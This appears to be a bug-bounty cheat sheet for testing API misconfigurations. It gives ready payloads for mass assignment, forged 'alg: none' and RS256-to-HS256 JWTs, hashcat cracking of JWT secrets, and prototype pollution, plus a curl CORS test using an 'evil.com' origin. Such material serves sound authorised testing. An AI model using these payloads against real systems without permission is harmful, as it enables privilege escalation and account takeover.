# API Security Misconfiguration

## Mass Assignment
```javascript
User.update(req.body)  // body has {"role": "admin"} → privilege escalation
```
Test params: `role`, `isAdmin`, `admin`, `isOwner`, `plan`, `credit`, `verified`, `email_verified`, `balance`, `permissions`, `group_id`, `subscription_tier`, `status`, `is_active`, `user_type`, `account_type`, `privilege`, `access_level`, `tenant_id`, `org_id`

## JWT None Algorithm
```python
header = {"alg": "none", "typ": "JWT"}
payload = {"sub": 1, "role": "admin"}
token = base64(header) + "." + base64(payload) + "."  # no signature
```

## JWT RS256 → HS256 Algorithm Confusion
```python
# Get server's public key from /.well-known/jwks.json
# Sign token with public key as HMAC secret
token = jwt.encode({"sub": "admin", "role": "admin"}, pub_key, algorithm="HS256")
# Server uses RS256 key as HS256 secret → accepts it
```

## JWT Weak Secret Bruteforce
```bash
hashcat -a 0 -m 16500 jwt.txt ~/wordlists/rockyou.txt
```

## Prototype Pollution (Server-Side)
```javascript
// Server-side merge without protection
{"__proto__": {"admin": true}}
{"constructor": {"prototype": {"admin": true}}}
// URL: ?__proto__[isAdmin]=true&__proto__[role]=superadmin
```

## CORS Exploitation
```bash
# Test: reflected origin + credentials
curl -s -I -H "Origin: https://evil.com" https://target.com/api/user/me
# If: Access-Control-Allow-Origin: https://evil.com + Access-Control-Allow-Credentials: true
# → CRITICAL: attacker reads credentialed responses
```

## CORS Wildcard Without Credentials = Info Only
```bash
# ACAO: * + no credentials → cannot read authenticated responses
# Only submit if: ACAO reflects arbitrary origin + credentials allowed
```

## Testing Checklist
```
[ ] Test mass assignment on all PUT/PATCH/POST endpoints
[ ] Test JWT alg: none
[ ] Test JWT RS256→HS256 confusion
[ ] Test JWT weak secret (if HS256)
[ ] Test prototype pollution (__proto__, constructor.prototype)
[ ] Test CORS: reflected origin + credentials
[ ] Test CORS: null origin
[ ] Test CORS: subdomain wildcard
```